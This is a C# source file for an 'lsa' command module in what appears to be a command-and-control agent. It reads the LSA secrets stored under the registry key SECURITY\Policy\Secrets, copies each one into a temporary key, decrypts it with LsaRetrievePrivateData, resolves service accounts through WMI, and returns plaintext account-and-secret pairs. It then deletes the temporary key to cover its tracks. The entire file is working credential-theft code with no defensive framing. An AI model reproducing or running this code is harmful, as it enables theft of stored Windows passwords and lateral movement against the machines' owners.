using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Management;
using Microsoft.Win32;


namespace Agent.Commands 
{
    public class LsaDump : AgentCommand
    {
        public override string Name => "lsa";

        public override string Execute(AgentTask task)
        {
            List<string> results = new List<string>();
            string[] keys = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets\").GetSubKeyNames();
            foreach (string user in keys)
            {
                var userSecretKey = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets\" + user);
                var destFakeKey = Registry.LocalMachine.CreateSubKey(@"SECURITY\Policy\Secrets\" + "Turtle");
                userSecretKey.CopyReg(destFakeKey);
                ExecuteDumpLsaSecrets("Turtle", user,ref results);
            }
            Registry.LocalMachine.DeleteSubKeyTree(@"SECURITY\Policy\Secrets\" + "Turtle", true);
            return string.Join("\n",results);
        }
        public static bool ExecuteDumpLsaSecrets(string key, string usrName,ref List<string> results)
        {
            // create registry key to copy
            var myKey = key;
            // attributes
            Native.Advapi.LSA_OBJECT_ATTRIBUTES objAttributes = new Native.Advapi.LSA_OBJECT_ATTRIBUTES();
            objAttributes.Length = 0;
            objAttributes.RootDirectory = IntPtr.Zero;
            objAttributes.Attributes = 0;
            objAttributes.SecurityDescriptor = IntPtr.Zero;
            objAttributes.SecurityQualityOfService = IntPtr.Zero;

            // localSystem
            Native.Advapi.LSA_UNICODE_STRING localSystem = new Native.Advapi.LSA_UNICODE_STRING();
            localSystem.Buffer = IntPtr.Zero;
            localSystem.Length = 0;
            localSystem.MaximumLength = 0;

            // secret name
            Native.Advapi.LSA_UNICODE_STRING secretName = new Native.Advapi.LSA_UNICODE_STRING();
            secretName.Buffer = Marshal.StringToHGlobalUni(myKey);
            secretName.Length = (ushort)(myKey.Length * UnicodeEncoding.CharSize);
            secretName.MaximumLength = (ushort)((myKey.Length + 1) * UnicodeEncoding.CharSize);

            // lsa policy handle
            IntPtr lsaPolicyHandle;
            Native.Advapi.LSA_AccessPolicy access = Native.Advapi.LSA_AccessPolicy.POLICY_GET_PRIVATE_INFORMATION;
            var lsaPolicyOpenHandle = Native.Advapi.LsaOpenPolicy(ref localSystem, ref objAttributes, (uint)access, out lsaPolicyHandle);
            if (lsaPolicyOpenHandle != 0)
            {
                return false;
            }
            // get private data
            IntPtr privData = IntPtr.Zero;
            var ntsResult = Native.Advapi.LsaRetrievePrivateData(lsaPolicyHandle, ref secretName, out privData);
            var lsaClose = Native.Advapi.LsaClose(lsaPolicyHandle);
            var lsaNtStatusError = Native.Advapi.LsaNtStatusToWinError(ntsResult);
            if (lsaNtStatusError != 0)
            {
                return false;
            }

            Native.Advapi.LSA_UNICODE_STRING lusSecretData = (Native.Advapi.LSA_UNICODE_STRING)Marshal.PtrToStructure(privData, typeof(Native.Advapi.LSA_UNICODE_STRING));
            string value = "";
            try
            {
                value = Marshal.PtrToStringAuto(lusSecretData.Buffer);
                value = value.Substring(0, (lusSecretData.Length / 2));
            }
            catch (Exception)
            {
                //Console.WriteLine(e);
                value = "";
                return false;
            }
            if (usrName.StartsWith("_SC_"))
            {
                string tmp = usrName.Replace("_SC_", "");
                SelectQuery sQuery = new SelectQuery(string.Format("select startname from Win32_Service where name = '{0}'", tmp)); // where name = '{0}'", "MCShield.exe"));
                using (ManagementObjectSearcher mgmtSearcher = new ManagementObjectSearcher(sQuery))
                {
                    foreach (ManagementObject service in mgmtSearcher.Get())
                    {
                        usrName = service["startname"].ToString();
                    }
                }
            }
            if (lusSecretData.Length == 0)
            {
                return true;
            }
            results.Add($"::: {usrName} -> {value} :::");
            return true;
        }
    }
    // class just for copy reg function,,, extends RegistryKey Class
    public static class regExtension
    {
        public static void CopyReg(this RegistryKey src, RegistryKey dest)
        {
            foreach (var name in src.GetValueNames())
            {
                dest.SetValue(name, src.GetValue(name), src.GetValueKind(name));
            }
            foreach (var name in src.GetSubKeyNames())
            {
                using (var srcSubKey = src.OpenSubKey(name, false))
                {
                    var dstSubKey = dest.CreateSubKey(name);
                    srcSubKey.CopyReg(dstSubKey);
                }
            }
        }
    }
}
